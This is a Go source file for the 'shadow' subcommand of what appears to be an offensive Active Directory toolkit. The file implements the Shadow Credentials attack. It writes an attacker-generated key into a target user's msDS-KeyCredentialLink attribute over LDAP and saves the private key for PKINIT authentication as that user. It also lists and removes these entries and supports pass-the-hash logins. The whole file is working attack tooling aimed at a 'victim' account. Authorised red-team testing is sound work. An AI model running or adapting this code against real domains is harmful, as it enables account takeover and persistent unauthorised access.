package main

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/loudmumble/trusted/pkg/pki"
	"github.com/spf13/cobra"
)

var shadowCmd = &cobra.Command{
	Use:   "shadow",
	Short: "Shadow Credentials — msDS-KeyCredentialLink attacks",
	Long: `Manage shadow credentials on AD user objects via msDS-KeyCredentialLink.
Allows PKINIT authentication without requiring a CA.

Examples:
  trusted shadow --add --target victim --target-dc dc01 --domain contoso.com -u admin -p pass
  trusted shadow --list --target victim --target-dc dc01 --domain contoso.com -u admin -p pass
  trusted shadow --remove --target victim --device-id <guid> --target-dc dc01 --domain contoso.com -u admin -p pass`,
	RunE: func(cmd *cobra.Command, args []string) error {
		doAdd, _ := cmd.Flags().GetBool("add")
		doList, _ := cmd.Flags().GetBool("list")
		doRemove, _ := cmd.Flags().GetBool("remove")

		if !doAdd && !doList && !doRemove {
			return cmd.Help()
		}

		targetDC, _ := cmd.Flags().GetString("target-dc")
		domain, _ := cmd.Flags().GetString("domain")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")
		hash, _ := cmd.Flags().GetString("hash")
		kerberos, _ := cmd.Flags().GetBool("kerberos")
		ccache, _ := cmd.Flags().GetString("ccache")
		keytabPath, _ := cmd.Flags().GetString("keytab")
		kdcIP, _ := cmd.Flags().GetString("dc-ip")
		target, _ := cmd.Flags().GetString("target")

		if targetDC == "" || domain == "" {
			return fmt.Errorf("--target-dc and --domain are required")
		}
		if !kerberos && (username == "" || (password == "" && hash == "")) {
			return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
		}
		if target == "" {
			return fmt.Errorf("--target is required (sAMAccountName like 'leo' or full DN)")
		}

		useTLS, _ := cmd.Flags().GetBool("ldaps")
		useStartTLS, _ := cmd.Flags().GetBool("start-tls")
		timeout, _ := cmd.Flags().GetInt("timeout")

		cfg := &pki.ADCSConfig{
			TargetDC: targetDC, Domain: domain,
			Username: username, Password: password, Hash: hash,
			Kerberos: kerberos, CCache: ccache, Keytab: keytabPath, KDCIP: kdcIP,
			UseTLS: useTLS, UseStartTLS: useStartTLS,
			Timeout: timeout,
		}

		// If target has no commas, it's a sAMAccountName — resolve via LDAP search
		if !strings.Contains(target, ",") {
			resolved, err := pki.ResolveSAMAccountName(cfg, target)
			if err != nil {
				return fmt.Errorf("resolve target %q: %w", target, err)
			}
			target = resolved
		}

		if doAdd {
			// Generate the key credential first (no LDAP yet)
			entry, err := pki.GenerateKeyCredential()
			if err != nil {
				return fmt.Errorf("generate key credential: %w", err)
			}

			// Write private key to disk BEFORE LDAP modify — if this fails, nothing
			// is orphaned in AD. If LDAP modify later fails, we clean up the file.
			keyPath := fmt.Sprintf("shadow_%s.key", entry.DeviceID[:8])
			keyFile, err := os.Create(keyPath)
			if err != nil {
				return fmt.Errorf("write key file: %w", err)
			}
			if err := pki.WriteECPrivateKey(keyFile, entry.PrivateKey); err != nil {
				keyFile.Close()
				os.Remove(keyPath)
				return fmt.Errorf("write key: %w", err)
			}
			keyFile.Close()

			// Now perform the LDAP modify to add the shadow credential
			if _, err := pki.AddShadowCredentialWithEntry(cfg, target, entry); err != nil {
				os.Remove(keyPath) // clean up key file on LDAP failure
				return err
			}

			outputJSON, _ := cmd.Flags().GetBool("json")
			if outputJSON {
				res := map[string]string{
					"status":   "success",
					"key_path": keyPath,
					"target":   target,
					"device_id": entry.DeviceID,
				}
				data, _ := json.MarshalIndent(res, "", "  ")
				fmt.Println(string(data))
				return nil
			}

			fmt.Printf("[+] Private key written to: %s\n", keyPath)
			return nil
		}

		if doList {
			creds, err := pki.ListShadowCredentials(cfg, target)
			if err != nil {
				return err
			}

			outputJSON, _ := cmd.Flags().GetBool("json")
			if outputJSON {
				data, _ := json.MarshalIndent(creds, "", "  ")
				fmt.Println(string(data))
				return nil
			}

			if len(creds) == 0 {
				fmt.Println("[*] No KeyCredentialLink values found")
				return nil
			}

			fmt.Printf("[+] Found %d KeyCredentialLink entries:\n\n", len(creds))
			for _, cred := range creds {
				fmt.Printf("  Entry %d:\n", cred.EntryIndex)
				if cred.DN != "" {
					fmt.Printf("    DN:   %s\n", cred.DN)
					if len(cred.BlobHex) > 32 {
						fmt.Printf("    Blob: %s... (%d bytes)\n", cred.BlobHex[:32], cred.BlobLength)
					}
				} else {
					fmt.Printf("    Raw: %s\n", cred.Raw)
				}
				fmt.Println()
			}
			return nil
		}

		if doRemove {
			deviceID, _ := cmd.Flags().GetString("device-id")
			if deviceID == "" {
				return fmt.Errorf("--device-id is required for removal")
			}
			err := pki.RemoveShadowCredential(cfg, target, deviceID)
			outputJSON, _ := cmd.Flags().GetBool("json")
			if outputJSON {
				status := "success"
				if err != nil {
					status = err.Error()
				}
				res := map[string]string{
					"status":    status,
					"target":    target,
					"device_id": deviceID,
				}
				data, _ := json.MarshalIndent(res, "", "  ")
				fmt.Println(string(data))
				return nil
			}
			return err
		}

		return nil
	},
}

func init() {
	rootCmd.AddCommand(shadowCmd)

	shadowCmd.Flags().Bool("add", false, "Add a shadow credential to the target")
	shadowCmd.Flags().Bool("list", false, "List shadow credentials on the target")
	shadowCmd.Flags().Bool("remove", false, "Remove a shadow credential from the target")
	shadowCmd.Flags().String("target", "", "Target user sAMAccountName or full DN (e.g. 'victim' — DN auto-built from --domain)")
	shadowCmd.Flags().String("device-id", "", "DeviceID of credential to remove")
	shadowCmd.Flags().String("target-dc", "", "Target domain controller")
	shadowCmd.Flags().String("domain", "", "Active Directory domain")
	shadowCmd.Flags().StringP("username", "u", "", "Domain username (user or user@domain)")
	shadowCmd.Flags().StringP("password", "p", "", "Domain password")
	shadowCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash")
	shadowCmd.Flags().BoolP("kerberos", "k", false, "Use Kerberos authentication (GSSAPI/SPNEGO)")
	shadowCmd.Flags().String("ccache", "", "Path to Kerberos ccache file (default: KRB5CCNAME env)")
	shadowCmd.Flags().String("keytab", "", "Path to Kerberos keytab file")
	shadowCmd.Flags().String("dc-ip", "", "KDC IP address (if different from --target-dc)")
	shadowCmd.Flags().Bool("ldaps", false, "Use LDAPS (TLS on port 636)")
	shadowCmd.Flags().Bool("start-tls", false, "Use StartTLS (upgrade on port 389)")
	shadowCmd.Flags().Int("timeout", 10, "Network timeout in seconds for LDAP/HTTP/RPC connections")
	shadowCmd.Flags().Bool("json", false, "Output results as JSON instead of human-readable text")
}
